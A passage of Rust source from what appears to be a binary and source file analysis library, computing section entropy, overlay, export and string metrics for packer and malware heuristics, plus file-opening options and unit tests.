        symbols,
        identity,
        references,
        errors,
    }
}

/// Whether an exported symbol represents a callable/public API rather than a
/// compiler or loader artifact.
///
/// Itanium-ABI RTTI (`_ZTI*` typeinfo, `_ZTS*` typename, `_ZTV*` vtable,
/// `_ZTT*` VTT) is emitted by the C++ compiler for any type used with
/// exceptions or `dynamic_cast`; `mh_execute_header` is the Mach-O image
/// header every executable exports. Neither says a caller can do anything
/// with this binary.
fn is_api_export(name: &str) -> bool {
    let bare = name.trim_start_matches('_');
    if bare == "mh_execute_header" {
        return false;
    }
    !(bare.starts_with("ZTI")
        || bare.starts_with("ZTS")
        || bare.starts_with("ZTV")
        || bare.starts_with("ZTT"))
}

/// Emit `imports.count`, `exports.count`, `exports.api_count`,
/// `functions.count`, and `binds.count` (calls/members are covered by the
/// byte-identical `ast.call_count`/`ast.member_count`; identifier
/// occurrence counts come from `identifier_metrics` —
/// `identifiers.count`/`identifiers.unique`) for whichever kinds have at
/// least one entry.
fn emit_symbol_kind_counts(symbols: &Symbols, metrics: &mut Metrics) {
    let mut imports = 0u64;
    let mut exports = 0u64;
    let mut api_exports = 0u64;
    let mut functions = 0u64;
    let mut binds = 0u64;
    for s in symbols {
        match s.kind() {
            SymbolKind::Import => imports += 1,
            SymbolKind::Export => {
                exports += 1;
                if is_api_export(s.name().unwrap_or_default()) {
                    api_exports += 1;
                }
            }
            SymbolKind::Function => functions += 1,
            SymbolKind::Bind => binds += 1,
            SymbolKind::Call | SymbolKind::Member | SymbolKind::Identifier => {}
        }
    }
    if imports > 0 {
        metrics.insert(metric!("imports.count"), imports as f64);
    }
    if exports > 0 {
        metrics.insert(metric!("exports.count"), exports as f64);
        // Exports minus the ones the toolchain emits on its own. A rule that
        // reads "this has a real public API, so treat it as a library" must not
        // be satisfied by artifacts: any C++ binary built with exceptions
        // exports typeinfo and typename symbols whether or not it exports
        // anything a caller could use, and a Mach-O executable always exports
        // `mh_execute_header`. An obfuscated stub with zero real exports
        // reaches four on artifacts alone, which is enough to trip an
        // `exports.count >= 4` suppression and silence the rules that would
        // have described it.
        metrics.insert(metric!("exports.api_count"), api_exports as f64);
    }
    if functions > 0 {
        metrics.insert(metric!("functions.count"), functions as f64);
    }
    if binds > 0 {
        metrics.insert(metric!("binds.count"), binds as f64);
    }
}

/// Heuristic: "looks like a natural-language sentence" — short enough
/// to be ML-cheap, long enough to filter out short tokens. A binary
/// embedding many of these usually contains documentation strings,
/// error messages, or string-table assets — a different population
/// than a binary whose strings are all `__cxx_…` symbols or paths.
fn is_sentence_like(text: &str) -> bool {
    if text.len() < 12 {
        return false;
    }
    let mut spaces = 0_usize;
    for b in text.bytes() {
        if b == b' ' {
            spaces += 1;
        }
    }
    if spaces < 2 {
        return false;
    }
    let mut alpha_tokens = 0_usize;
    let mut tokens = 0_usize;
    for tok in text.split_whitespace() {
        tokens += 1;
        if tok.chars().filter(|c| c.is_alphabetic()).count() >= 2 {
            alpha_tokens += 1;
        }
    }
    tokens >= 3 && alpha_tokens >= 2
}

/// Map a [`FileType`] to the [`Stage`] we tag against when an
/// extractor returns `Err` and we have to synthesise a fallback
/// error record. Stage values are stable across releases.
fn stage_for(file_type: FileType) -> Stage {
    // Every tree-sitter language, so a new grammar needs no entry here. JCL
    // has no grammar but has always reported as source.
    if formats::source::supports(file_type) || file_type == FileType::Jcl {
        return Stage::SourceExtract;
    }
    match file_type {
        FileType::Pe => Stage::PeParse,
        FileType::Elf => Stage::ElfParse,
        FileType::MachO => Stage::MachoParse,
        FileType::Ooxml => Stage::OoxmlParse,
        FileType::OleDoc | FileType::Msi => Stage::Ole2Parse,
        FileType::Zip | FileType::Crx | FileType::Odf | FileType::Jar => Stage::ZipParse,
        FileType::Tar | FileType::TarGz | FileType::TarBz2 | FileType::TarXz | FileType::TarZst => {
            Stage::TarParse
        }
        FileType::JavaClass => Stage::ClassParse,
        FileType::Pdf => Stage::PdfParse,
        FileType::Rpm => Stage::RpmParse,
        FileType::Wasm => Stage::WasmParse,
        FileType::SevenZ => Stage::SevenZipParse,
        _ => Stage::FormatExtract,
    }
}

fn panic_payload_message(payload: Box<dyn std::any::Any + Send>) -> String {
    match payload.downcast::<String>() {
        Ok(message) => *message,
        Err(payload) => match payload.downcast::<&'static str>() {
            Ok(message) => (*message).to_string(),
            Err(_) => String::new(),
        },
    }
}

fn emit_section_metrics(sections: &Sections, metrics: &mut Metrics) {
    metrics.insert(metric!("sections.count"), sections.len() as f64);

    // Per-section entropies live on `Section.entropy`. Aggregate
    // max / mean across the sections that have file-backed bytes (the
    // `None` entries are SHT_NOBITS / BSS-style purely-virtual regions
    // and shouldn't pull the mean toward zero).
    let mut entropy_max = 0.0_f64;
    let mut max_span: Option<Span> = None;
    let mut entropy_sum = 0.0_f64;
    let mut entropy_n = 0_u64;
    for s in sections {
        if let Some(e) = s.entropy {
            if max_span.is_none() || e > entropy_max {
                entropy_max = e;
                max_span = Some(Span::new(s.file_offset, s.file_size));
            }
            entropy_sum += e;
            entropy_n += 1;
        }
    }
    if entropy_n > 0 {
        // Locate the peak-entropy section so a packer/encrypted-section finding
        // can point at it; the mean has no single location.
        match max_span {
            Some(span) => {
                metrics.insert_located(metric!("sections.max_entropy"), entropy_max, [span])
            }
            None => metrics.insert(metric!("sections.max_entropy"), entropy_max),
        }
        metrics.insert(
            metric!("sections.avg_entropy"),
            entropy_sum / entropy_n as f64,
        );
    }

    let mut executable = 0_u64;
    let mut writable = 0_u64;
    let mut wx = 0_u64;
    let mut code_size: u64 = 0;
    let mut nonstandard = 0_u64;
    let mut concatenated_names: Vec<u8> = Vec::new();
    for s in sections {
        let is_exec = s.is_executable();
        let is_write = s.is_writable();
        if is_exec {
            executable += 1;
            code_size = code_size.saturating_add(s.file_size);
        }
        if is_write {
            writable += 1;
        }
        if is_exec && is_write {
            wx += 1;
        }
        if !is_well_known_section_name(&s.name) {
            nonstandard += 1;
        }
        concatenated_names.extend_from_slice(s.name.as_bytes());
    }
    metrics.insert(metric!("sections.executable_count"), executable as f64);
    metrics.insert(metric!("sections.writable_count"), writable as f64);
    metrics.insert(metric!("sections.executable_writable_count"), wx as f64);
    if code_size > 0 {
        metrics.insert(metric!("sections.code_size"), code_size as f64);
    }
    metrics.insert(metric!("sections.nonstandard_count"), nonstandard as f64);
    if !concatenated_names.is_empty() {
        metrics.insert(
            metric!("sections.name_entropy"),
            scan::entropy::shannon(&concatenated_names),
        );
    }
}

/// `true` when `name` matches a section name routinely produced by
/// upstream toolchains across PE/ELF/Mach-O. Packers and obfuscators
/// rename or invent sections (`.UPX0`, `.aspack`, random hex tags)
/// which trip `sections.nonstandard_count`. Membership is intentionally
/// loose — any section the test corpus shows in benign binaries is in.
fn is_well_known_section_name(name: &str) -> bool {
    // Mach-O sections come in as `SEGMENT,section` (e.g. `__TEXT,__text`).
    // Strip the segment prefix and check the section stem. For PE/ELF
    // we additionally strip a leading dot so dotted (`.text`) and
    // undotted (`text`) forms share the same lookup.
    let stem = name
        .rsplit_once(',')
        .map_or(name, |(_, s)| s)
        .trim_start_matches('.');
    matches!(
        stem,
        // PE / ELF — the canonical set.
        "text" | "rdata" | "data" | "bss" | "rodata" | "idata" | "edata"
        | "pdata" | "xdata" | "tls" | "reloc" | "rsrc" | "debug" | "init"
        | "fini" | "plt" | "got" | "got.plt" | "plt.got" | "plt.sec"
        | "dynamic" | "dynsym" | "dynstr" | "symtab" | "strtab" | "shstrtab"
        | "interp" | "note" | "hash" | "gnu.hash" | "gnu.version"
        | "gnu.version_r" | "gnu.version_d" | "eh_frame" | "eh_frame_hdr"
        | "comment" | "ARM.exidx" | "ARM.extab" | "ARM.attributes"
        | "init_array" | "fini_array" | "preinit_array" | "ctors" | "dtors"
        | "tbss" | "tdata" | "tm_clone_table" | "data.rel.ro"
        | "got.plt.sec" | "stab" | "stabstr" | "drectve" | "didat"
        // Mach-O segment,section combos (after dot-strip we still match the
        // common ones — the names below come from the typical Mach-O
        // layout where `Section.name` is `"__text"`, `"__data"`, etc.,
        // *without* the segment prefix).
        | "__text" | "__data" | "__bss" | "__cstring" | "__const"
        | "__objc_classlist" | "__objc_classrefs" | "__objc_data"
        | "__objc_classname" | "__objc_const" | "__objc_methname"
        | "__objc_methtype" | "__objc_selrefs" | "__objc_imageinfo"
        | "__la_symbol_ptr" | "__nl_symbol_ptr" | "__got" | "__stubs"
        | "__stub_helper" | "__cfstring" | "__unwind_info" | "__eh_frame"
        | "__info_plist" | "__swift5_proto" | "__swift5_types"
        | "__swift5_fieldmd" | "__swift5_typeref" | "__swift5_reflstr"
        | "__swift5_assocty" | "__swift5_capture" | "__swift5_builtin"
        | "__swift5_acfuncs" | "__swift5_mpenum" | "__llvm_covmap"
        | "__llvm_covfun" | "__llvm_prf_cnts" | "__llvm_prf_data"
        | "__llvm_prf_names" | "__llvm_prf_vnds"
    )
}

/// Cap on located high-entropy string spans. The count metric is exact; the
/// spans are a bounded sample for localisation.
const MAX_STRING_SPANS: usize = 64;

/// Cross-format `binary.*` aggregates derived from sections + strings +
/// raw bytes. Keeps the keys cleave's trait engine has used historically
/// without each format extractor re-deriving the same logic.
///
/// Emits (only the useful subset — fields cleave computed but no trait
/// queried were dropped):
/// - `binary.string_count`, `binary.max_string_length`,
///   `binary.avg_string_length`, `binary.high_entropy_string_count`.
/// - `binary.entropy_variance` — population variance across the
///   per-section entropies. Packers tend to flatten this; a normal
///   binary spreads across `.text` (~6), `.rodata` (~5), `.data` (~3).
/// - `binary.code_to_data_ratio`, `binary.largest_section_ratio` —
///   simple structural ratios over `Sections.file_size`.
///
/// The overlay keys come from [`emit_binary_overlay`].
fn emit_binary_aggregates(
    sections: &Sections,
    strings: &output::Strings,
    bytes: &[u8],
    metrics: &mut Metrics,
) {
    // -- Strings ------------------------------------------------------
    let total = strings.len();
    if total > 0 {
        let mut max_len = 0_usize;
        let mut max_string_span: Option<Span> = None;
        let mut sum_len = 0_usize;
        let mut high_entropy = 0_u64;
        let mut high_entropy_spans = SpanBuilder::with_cap(MAX_STRING_SPANS);
        let mut sentence = 0_u64;
        // Collect lengths once; second pass below computes stddev.
        let mut lengths: Vec<usize> = Vec::with_capacity(total);
        for (span, s) in strings.text_spans() {
            let len = s.len();
            if len > max_len {
                max_len = len;
                max_string_span = Some(span);
            }
            sum_len = sum_len.saturating_add(len);
            lengths.push(len);
            // Shannon-entropy floor of 6.0 bits/byte separates random-
            // looking strings (base64, keys, hex blobs) from English /
            // identifier-shaped text (~3–4.5).
            if scan::entropy::shannon(s.as_bytes()) >= 6.0 {
                high_entropy += 1;
                high_entropy_spans.push(span.offset, span.len);
            }
            if is_sentence_like(s) {
                sentence += 1;
            }
        }
        let avg = sum_len as f64 / total as f64;
        let variance = lengths
            .iter()
            .map(|&l| {
                let d = l as f64 - avg;
                d * d
            })
            .sum::<f64>()
            / total as f64;
        metrics.insert(metric!("binary.string_count"), total as f64);
        match max_string_span {
            Some(span) => {
                metrics.insert_located(metric!("binary.max_string_length"), max_len as f64, [span])
            }
            None => metrics.insert(metric!("binary.max_string_length"), max_len as f64),
        }
        metrics.insert(metric!("binary.avg_string_length"), avg);
        metrics.insert(metric!("binary.string_length_stddev"), variance.sqrt());
        metrics.insert_located(
            metric!("binary.high_entropy_string_count"),
            high_entropy as f64,
            high_entropy_spans.into_spans(),
        );
        metrics.insert(metric!("binary.sentence_string_count"), sentence as f64);
        metrics.insert(
            metric!("binary.sentence_string_ratio"),
            sentence as f64 / total as f64,
        );
    }

    // -- Per-section entropy variance --------------------------------
    let entropies: Vec<f64> = sections.iter().filter_map(|s| s.entropy).collect();
    if entropies.len() >= 2 {
        let mean = entropies.iter().sum::<f64>() / entropies.len() as f64;
        let var =
            entropies.iter().map(|e| (e - mean).powi(2)).sum::<f64>() / entropies.len() as f64;
        metrics.insert(metric!("binary.entropy_variance"), var);
    }

    // -- Section ratios + size-weighted entropy ----------------------
    // `binary.code_entropy` / `binary.data_entropy` are size-weighted
    // averages of per-section entropies. Weighting by `file_size` is
    // what packer detectors want — a tiny `.init` block at 7.9 entropy
    // shouldn't dominate the `.text` average.
    let mut code_size: u64 = 0;
    let mut data_size: u64 = 0;
    let mut largest: u64 = 0;
    let mut code_entropy_sum = 0.0_f64;
    let mut data_entropy_sum = 0.0_f64;
    let mut code_spans = Vec::new();
    let mut data_spans = Vec::new();
    for s in sections {
        let is_code = s.is_code();
        let is_data = s.is_writable() || s.flags.iter().any(|flag| flag == "data");
        let on_disk = s.file_size;
        largest = largest.max(on_disk);
        let entropy = s.entropy.unwrap_or(0.0);
        if is_code {
            code_size = code_size.saturating_add(on_disk);
            code_entropy_sum += entropy * on_disk as f64;
            if on_disk > 0 {
                code_spans.push(Span::new(s.file_offset, on_disk));
            }
        } else if is_data {
            data_size = data_size.saturating_add(on_disk);
            data_entropy_sum += entropy * on_disk as f64;
            if on_disk > 0 {
                data_spans.push(Span::new(s.file_offset, on_disk));
            }
        }
    }
    if code_size > 0 {
        metrics.insert_located(
            metric!("binary.code_entropy"),
            code_entropy_sum / code_size as f64,
            code_spans,
        );
    }
    if data_size > 0 {
        metrics.insert_located(
            metric!("binary.data_entropy"),
            data_entropy_sum / data_size as f64,
            data_spans,
        );
    }
    // Both sums come from file-declared section sizes; adding them as `u64`
    // overflowed on forged sizes near `u64::MAX`, and saturating would skew
    // the ratio, so take it in floating point.
    let classified = code_size as f64 + data_size as f64;
    if classified > 0.0 {
        metrics.insert(
            metric!("binary.code_to_data_ratio"),
            code_size as f64 / classified,
        );
    }
    let file_size = bytes.len() as u64;
    if file_size > 0 && largest > 0 {
        let largest_spans = sections
            .iter()
            .filter(|s| s.file_size == largest && s.file_size > 0)
            .map(|s| Span::new(s.file_offset, s.file_size));
        metrics.insert_located(
            metric!("binary.largest_section_ratio"),
            largest as f64 / file_size as f64,
            largest_spans,
        );
    }
}

/// `binary.has_overlay`, `binary.overlay_size`, `binary.overlay_ratio`,
/// `binary.overlay_entropy` — bytes beyond the last on-disk section extent
/// and beyond `image_end` (PE installer droppers, ELF self-extractors).
/// `image_end` is the format's own end of image where that lies past the
/// sections: Mach-O's section-less `__LINKEDIT` segment (symbols, dyld
/// info, code signature) and the ELF section-header table would otherwise
/// read as an overlay on every binary. PE passes `None`: its overlay stays
/// "past the last section's raw data", Authenticode table included.
fn emit_binary_overlay(
    sections: &Sections,
    bytes: &[u8],
    image_end: Option<u64>,
    metrics: &mut Metrics,
) {
    // Last on-disk extent across sections and the format's own image end.
    let file_size = bytes.len() as u64;
    let last_extent = sections
        .as_slice()
        .iter()
        .map(|s| s.file_offset.saturating_add(s.file_size))
        .max()
        .unwrap_or(0)
        .max(image_end.unwrap_or(0));
    if last_extent > 0 && file_size > last_extent {
        let overlay_size = file_size - last_extent;
        metrics.insert(metric!("binary.has_overlay"), 1.0);
        metrics.insert(metric!("binary.overlay_size"), overlay_size as f64);
        metrics.insert(
            metric!("binary.overlay_ratio"),
            overlay_size as f64 / file_size as f64,
        );
        if let Some(overlay) = bytes
            .get(last_extent as usize..)
            .filter(|overlay| !overlay.is_empty())
        {
            // The overlay is appended payload (installer stub, SFX); carry its
            // extent so a finding points past the last section.
            metrics.insert_located(
                metric!("binary.overlay_entropy"),
                scan::entropy::shannon(overlay),
                [Span::new(last_extent, overlay_size)],
            );
        }
    }
}

impl<'a> ParsedFile<'a> {
    fn new(bytes: &'a [u8], fileid: FileId, basename: Option<String>) -> Self {
        Self {
            bytes,
            fileid,
            basename,
            tree_parse: OnceLock::new(),
            flow: OnceLock::new(),
            cfml_parse: OnceLock::new(),
            cancellation: None,
            cache: false,
            rizin: rizin::Settings::default(),
            extracted: OnceLock::new(),
            parse_count: AtomicU32::new(0),
        }
    }
}

/// The basename surfaced as `file.basename`. Lossy rather than dropped: a
/// name that is not valid UTF-8 is common among samples, and losing it would
/// hide `file.basename` / `file.stem` from exactly those files.
fn basename_of(path: &Path) -> Option<String> {
    path.file_name()
        .map(|name| name.to_string_lossy().into_owned())
}

/// How [`OpenOptions::open`] settles the file type.
#[derive(Clone, Copy, Debug)]
enum Identification {
    /// Detect from the bytes, and from the path when one was given.
    Detect,
    /// The caller's type, bypassing detection ([`OpenOptions::file_type`]).
    Forced(FileType),
    /// The caller's own detection result ([`OpenOptions::fileid`]).
    Precomputed(FileId),
}

/// How to open bytes as a [`ParsedFile`]: what identification may use, and
/// the settings its extraction runs under.
///
/// Every setting belongs to the `ParsedFile` it opens. Nothing here is
/// process-wide, so one process can open files under different settings at
/// the same time — rizin on for one and off for another, the disk cache on
/// for one and off for another — without either seeing the other's.
///
/// [`OpenOptions::new`] gives the library defaults; [`open`] is shorthand
/// for opening with them. Setters consume and return the options, and
/// [`open`](Self::open) borrows them, so one value configured once can open
/// many files (clone it to vary the path per file):
///
/// ```no_run
/// use std::path::Path;
/// use std::time::Duration;
///
/// let options = filefacts::OpenOptions::new().rizin_timeout(Duration::from_secs(60));
/// for name in ["a.exe", "b.so"] {
///     let bytes = std::fs::read(name)?;
///     let parsed = options.clone().path(Path::new(name)).open(&bytes);
///     println!("{name}: {:?}", parsed.fileid().file_type());
/// }
/// # Ok::<(), std::io::Error>(())
/// ```
#[must_use]
#[derive(Clone, Debug)]
pub struct OpenOptions<'a> {
    path: Option<PathBuf>,
    identification: Identification,
    cancellation: Option<&'a AtomicBool>,
    cache: bool,
    rizin: rizin::Settings,
}

impl Default for OpenOptions<'_> {
    fn default() -> Self {
        Self::new()
    }
}

impl<'a> OpenOptions<'a> {
    /// The library defaults:
    ///
    /// * identification from the bytes alone (until [`path`](Self::path)
    ///   is given);
    /// * no cancellation flag;
    /// * the disk cache off, unless the `FILEFACTS_CACHE` environment
    ///   variable turns it on (see [`cache::env_override`]);
    /// * rizin on when it is installed, with a
    ///   [`rizin::DEFAULT_RIZIN_TIMEOUT_SECS`] budget per run, no size cap,
    ///   and every slice of a fat Mach-O analysed.
    pub fn new() -> Self {
        Self {
            path: None,
            identification: Identification::Detect,
            cancellation: None,
            cache: cache::env_override().unwrap_or(false),
            rizin: rizin::Settings::default(),
        }
    }

    /// The file's path, for identification and for `file.basename`.
    ///
    /// Some formats are only distinguishable by extension or well-known
    /// basename (`package.json` is JSON byte for byte but carries different
    /// metadata than a generic JSON document), so pass the path when you have
    /// it. The basename is surfaced as the `file.basename` and `file.stem`
    /// values. Nothing is read from the path.
    pub fn path(mut self, path: &Path) -> Self {
        self.path = Some(path.to_path_buf());
        self
    }

    /// Force the file type, bypassing content and extension detection.
    ///
    /// Identification normally trusts magic bytes, then the path/extension,
    /// then content heuristics. Some callers already know the language from
    /// context the bytes don't carry, and detection would otherwise give the
    /// wrong answer or fall back to [`FileType::Unknown`]. The motivating
    /// case is an interpreter inline-code payload: the body extracted from
    /// `python3 -c "<code>"` is genuine Python, but stripped of its shebang
    /// and carried under a virtual path with no usable extension, so the
    /// detector can't see it. Forcing the type lets
    /// [`ParsedFile::source_ast`] select the correct tree-sitter grammar.
    ///
    /// A [`path`](Self::path) then only supplies the basename. Replaces an
    /// earlier [`fileid`](Self::fileid).
    pub fn file_type(mut self, file_type: FileType) -> Self {
        self.identification = Identification::Forced(file_type);
        self
    }

    /// Use a [`FileId`] the caller already computed with
    /// [`FileId::from_path_and_bytes`] instead of detecting again. Detection
    /// on a compressed tar inflates up to 64 MiB of it to decide npm/sdist,
    /// so a caller that has already paid for that must not pay it twice.
    ///
    /// A [`path`](Self::path) then only supplies the basename. Replaces an
    /// earlier [`file_type`](Self::file_type).
    pub fn fileid(mut self, fileid: FileId) -> Self {
        self.identification = Identification::Precomputed(fileid);
        self
    }

    /// Poll `flag` during long-running leaf work, abandoning it when the flag
    /// goes true. Currently observed by the tree-sitter parse, the one leaf
    /// that can run long on adversarial input without spawning a process.
    ///
    /// Cancelling is *not* an error: the affected view degrades to a
    /// diagnostic (`source.ast_unavailable.parse_cancelled`) and every other
    /// fact family still extracts, so a caller that cancels mid-file still
    /// gets a usable — if shallower — result.
    ///
    /// The flag is borrowed for the [`ParsedFile`]'s lifetime. filefacts
    /// only ever reads it, never sets it, which is what makes it safe to
    /// share across threads without an `Arc` here.
    ///
    /// Rizin is deliberately *not* wired to this: it enforces its own hard
    /// wall-clock budget ([`rizin_timeout`](Self::rizin_timeout)) and kills
    /// its process group, so it is already bounded.
    pub fn cancellation(mut self, flag: &'a AtomicBool) -> Self {
        self.cancellation = Some(flag);
        self
    }

    /// Read and write the disk cache in [`cache`].
    ///
    /// When on, the first view access reads a matching entry from the user
    /// cache directory, or writes one after computing the views; a later open
    /// of the same bytes, under the same settings, skips the extraction (and
    /// its rizin run). The key covers the bytes, the filefacts build, the
    /// detected type, the basename and
    /// [`rizin_fingerprint`](Self::rizin_fingerprint). Outranks
    /// `FILEFACTS_CACHE`.
    pub fn cache(mut self, enabled: bool) -> Self {
        self.cache = enabled;
        self
    }

    /// Run an installed rizin to recover symbols, functions and sections
    /// from PE, ELF and Mach-O binaries the static parse leaves thin (see
    /// [`rizin`]). On by default; turn it off to keep extraction free of
    /// subprocesses.
    pub fn rizin(mut self, enabled: bool) -> Self {
        self.rizin.enabled = enabled;
        self
    }

    /// Wall-clock budget for one rizin run; a run past it is killed with its
    /// process group and the file keeps its static facts.
    /// [`rizin::DEFAULT_RIZIN_TIMEOUT_SECS`] by default. Latency-sensitive
    /// hosts lower it.
    pub fn rizin_timeout(mut self, timeout: Duration) -> Self {
        self.rizin.timeout = timeout;
        self
    }

    /// Skip rizin for inputs larger than `max_bytes`. A full analysis of a
    /// 100 MB+ stripped binary costs minutes, so a latency-sensitive host
    /// caps it to keep one giant from dominating a scan. No cap by default.
    pub fn rizin_max_bytes(mut self, max_bytes: usize) -> Self {
        self.rizin.max_bytes = Some(max_bytes);
        self
    }

    /// Hand rizin only the host-native slice of a fat Mach-O instead of the
    /// whole universal binary: the other slices never run on this host, and
    /// analysing each is the bulk of the cost. Off by default, so a
    /// filesystem scan covers every slice.
    pub fn rizin_native_arch_only(mut self, enabled: bool) -> Self {
        self.rizin.native_arch_only = enabled;
        self
    }

    /// The rizin part of the disk-cache key for files opened with these
    /// options: whether rizin runs (installed and enabled), its version,
    /// native-arch slicing and the size cap — every rizin setting that
    /// changes a persisted extraction. The timeout is not part of it: a run
    /// that completes is the same under any budget, and one that times out
    /// is never persisted (see [`ParsedFile::rizin_recovery_incomplete`]).
    ///
    /// For a host keying its own cache of results derived from filefacts.
    #[must_use]
    pub fn rizin_fingerprint(&self) -> String {
        rizin::cache_fingerprint(&self.rizin)
    }

    /// Identify `bytes` and return a [`ParsedFile`] that borrows them.
    ///
    /// Identification falls back to [`FileType::Unknown`] rather than
    /// failing, so this cannot fail. No filesystem access happens here; the
    /// first view access runs the extraction, which may use the disk cache
    /// and spawn rizin as these options allow.
    pub fn open<'b>(&self, bytes: &'b [u8]) -> ParsedFile<'b>
    where
        'a: 'b,
    {
        let fileid = match (self.identification, self.path.as_deref()) {
            (Identification::Detect, None) => FileId::from_bytes(bytes),
            (Identification::Detect, Some(path)) => FileId::from_path_and_bytes(path, bytes),
            (Identification::Forced(file_type), _) => FileId::forced(file_type),
            (Identification::Precomputed(fileid), _) => fileid,
        };
        let mut parsed = ParsedFile::new(bytes, fileid, self.path.as_deref().and_then(basename_of));
        parsed.cancellation = self.cancellation;
        parsed.cache = self.cache;
        parsed.rizin = self.rizin;
        parsed
    }
}

/// Open `bytes` with the default [`OpenOptions`]: identified from content
/// alone (magic bytes, shebang, lightweight pattern matching), with the
/// library's default cache and rizin settings. Use [`OpenOptions`] to supply
/// a path, a known type, a cancellation flag or other settings.
///
/// The returned [`ParsedFile`] borrows the slice for its lifetime. No
/// filesystem access happens here; the first view access may use the disk
/// cache (see the crate-level "Side effects" section).
pub fn open(bytes: &[u8]) -> ParsedFile<'_> {
    OpenOptions::new().open(bytes)
}

/// Read a file from disk, identify it, and return its bytes paired
/// with a [`FileId`].
///
/// The bytes and identification are returned so the caller can open them
/// without re-reading or re-identifying the file:
///
/// ```no_run
/// let path = std::path::Path::new("sample.exe");
/// let (bytes, fileid) = filefacts::from_path(path)?;
/// let parsed = filefacts::OpenOptions::new()
///     .path(path)
///     .fileid(fileid)
///     .open(&bytes);
/// # Ok::<(), filefacts::Error>(())
/// ```
pub fn from_path(path: &Path) -> Result<(Vec<u8>, FileId), Error> {
    let bytes = std::fs::read(path)?;
    let fileid = FileId::from_path_and_bytes(path, &bytes);
    Ok((bytes, fileid))
}

/// Compile a tree-sitter S-expression query against the grammar named
/// `language`. Used by rule engines that want to validate a query
/// string at load time without holding a parsed file. Recognised
/// language names match the values exposed under `values.source.language`
/// (e.g. `"python"`, `"javascript"`, `"perl"`, `"makefile"`), plus a few
/// common aliases such as `"js"`, `"shell"` and `"c#"`.
///
/// # Errors
///
/// [`Error::UnsupportedLanguage`] when no grammar answers to `language`, and
/// [`Error::InvalidQuery`], carrying the [`tree_sitter::QueryError`], when
/// `query` does not compile against it.
pub fn validate_source_query(language: &str, query: &str) -> Result<(), Error> {
    let unsupported = || Error::UnsupportedLanguage(language.to_string());
    let file_type = file_type_for_language(language).ok_or_else(unsupported)?;
    let ts_lang = formats::source::tree_sitter_language(file_type).ok_or_else(unsupported)?;
    tree_sitter::Query::new(&ts_lang, query)
        .map(|_| ())
        .map_err(|source| Error::InvalidQuery {
            language: language.to_string(),
            source,
        })
}

/// Alternative spellings [`validate_source_query`] accepts, each mapped to
/// the `values.source.language` label it stands for.
const SOURCE_LANGUAGE_ALIASES: &[(&str, &str)] = &[
    ("js", "javascript"),
    ("ts", "typescript"),
    ("shell", "bash"),
    ("c#", "csharp"),
    ("ps1", "powershell"),
    ("objective-c", "objc"),
    ("clj", "clojure"),
    ("cljs", "clojure"),
    ("cljc", "clojure"),
    ("make", "makefile"),
];

/// The source file type named `name`: a `values.source.language` label or
/// one of [`SOURCE_LANGUAGE_ALIASES`].
fn file_type_for_language(name: &str) -> Option<FileType> {
    let label = SOURCE_LANGUAGE_ALIASES
        .iter()
        .find_map(|&(alias, label)| (alias == name).then_some(label))
        .unwrap_or(name);
    formats::source::file_type_for_language(label)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn forged_section_sizes_do_not_overflow_the_code_data_ratio() {
        // Two sections each claiming nearly `u64::MAX` bytes: the code and
        // data sums used to be added unchecked.
        let section = |name: &str, flag: &str| Section {
            name: name.into(),
            vaddr: 0,
            vsize: 0,
            file_offset: 0,
            file_size: u64::MAX - 1,
            flags: vec![flag.into()],
            flags_raw: None,
            entropy: Some(1.0),
        };
        let sections = Sections::from_iter([section("a", "executable"), section("b", "data")]);
        let mut metrics = Metrics::new();
        emit_binary_aggregates(&sections, &output::Strings::new(), b"x", &mut metrics);
        assert_eq!(
            metrics.get_key(&metric!("binary.code_to_data_ratio")),
            Some(0.5)
        );
    }

    #[test]
    fn guarded_turns_a_panic_into_its_message() {
        assert_eq!(guarded(|| 7), Ok(7));
        let caught: Result<(), String> = guarded(|| panic!("boom"));
        assert_eq!(caught, Err("boom".to_string()));
    }

    #[test]
    fn invalid_utf8_cfml_does_not_take_down_the_caller() {
        // Used to panic in the CFML flow parse, which sat outside every
        // `catch_unwind` and so aborted the whole process.
        let mut source = b"<cfset a = ".to_vec();
        source.extend(std::iter::repeat_n(0xFF, 100));
        source.extend_from_slice(b".foo()>");
        let parsed = OpenOptions::new()
            .path(Path::new("x.cfm"))
            .file_type(FileType::Cfml)
            .open(&source);
        let _ = parsed.flow();
        let _ = parsed.symbols();
    }

    #[test]
    fn failed_identification_is_recorded_as_an_error() {
        let fileid = FileId {
            source: fileid::DetectionSource::Failed,
            ..FileId::forced(FileType::Unknown)
        };
        let parsed = ParsedFile::new(b"\x00\x01", fileid, None);
        let entry = parsed.errors().iter().next().expect("recorded");
        assert_eq!(entry.stage, Stage::Identify);
        assert_eq!(entry.kind, ErrorKind::Panic);
    }

    #[cfg(unix)]
    #[test]
    fn non_utf8_basename_is_kept_lossily() {
        use std::os::unix::ffi::OsStrExt;
        let path = Path::new(std::ffi::OsStr::from_bytes(b"dropper-\xff.sh"));
        let parsed = OpenOptions::new().path(path).open(b"#!/bin/sh\necho hi\n");
        assert_eq!(
            parsed
                .values()
                .get("file.basename")
                .and_then(|v| v.as_str()),
            Some("dropper-\u{fffd}.sh")
        );
    }

    #[test]
    fn validate_source_query_accepts_every_parser_language() {
        for language in [
            "javascript",
            "typescript",
            "python",
            "go",
            "rust",
            "java",
            "bash",
            "ruby",
            "lua",
            "csharp",
            "c",
            "scala",
            "objc",
            "kotlin",
            "swift",
            "powershell",
            "php",
            "perl",
            "groovy",
            "zig",
            "elixir",
            "makefile",
            "clojure",
            "batch",
        ] {
            let file_type = file_type_for_language(language)
                .unwrap_or_else(|| panic!("{language} has a parser but no query mapping"));
            assert!(formats::source::supports(file_type), "{language}");
            validate_source_query(language, "(_) @node")
                .unwrap_or_else(|e| panic!("{language}: {e}"));
        }
    }

    #[test]
    fn validate_source_query_accepts_aliases() {
        for (alias, label) in SOURCE_LANGUAGE_ALIASES {
            assert_eq!(
                file_type_for_language(alias),
                file_type_for_language(label),
                "{alias}"
            );
            validate_source_query(alias, "(_) @node").unwrap_or_else(|e| panic!("{alias}: {e}"));
        }
    }

    #[test]
    fn validate_source_query_reports_unsupported_language() {
        let err = validate_source_query("cobol", "(_) @node").unwrap_err();
        assert!(matches!(&err, Error::UnsupportedLanguage(name) if name == "cobol"));
        assert_eq!(err.to_string(), "unsupported language for ast query: cobol");
        assert!(std::error::Error::source(&err).is_none());
    }

    #[test]
    fn validate_source_query_reports_invalid_query_with_its_cause() {
        let err = validate_source_query("python", "(no_such_node) @n").unwrap_err();
        let Error::InvalidQuery { language, source } = &err else {
            panic!("expected InvalidQuery, got {err:?}");
        };
        assert_eq!(language, "python");
